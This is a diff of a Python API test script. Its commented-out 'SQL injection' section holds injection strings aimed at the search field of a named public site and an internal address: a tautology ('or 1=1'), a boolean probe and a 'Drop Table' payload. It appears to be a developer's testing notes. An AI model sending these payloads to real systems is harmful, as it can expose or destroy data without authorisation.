@@ -23,7 +23,8 @@ datas = {
     'myrouteparams': [
         {'param': 'apitestparam1', 'datatype': 1},
         {'param': 'apitestparam2', 'datatype': 1}],
-    'myresponsegroup': [{'name': 'firstgroup', 'mygroupparams': [{'param': '1group1param'}, {'param': '1group2param'}]},]
+    'myresponsegroup': [
+        {'name': 'firstgroup', 'mygroupparams': [{'param': '1group1param'}, {'param': '1group2param'}]}, ]
     # 'myresponsegroup': [],
 }
 setroute = requests.post(url + 'route/', headers=JSONHeaders, json=datas).json()
@@ -31,10 +32,11 @@ print(setroute)
 
 # sql注入相关
 # URL='http://www.zszywx.com/CMSInfo/WebFile/Web_2/html/news_list.html'
+# URL2='http://192.168.60.114:6005/CMSInfo/WebFile/Web_2/html/news_list.html'
 # data='一张卷'
 # #查询失效字符串
 # sqldata='一张卷\' or \'1\'=\'1\' or \'1\' !=\''
 # sql2data="; and 1=1 and 1=2"
 # droptabledata='一张卷\';Drop Table '
-# res=requests.get(url=URL,params={'Search':sqldata})
+# res=requests.get(url=URL,params={'Search':sql2data})
 # print(res.text)
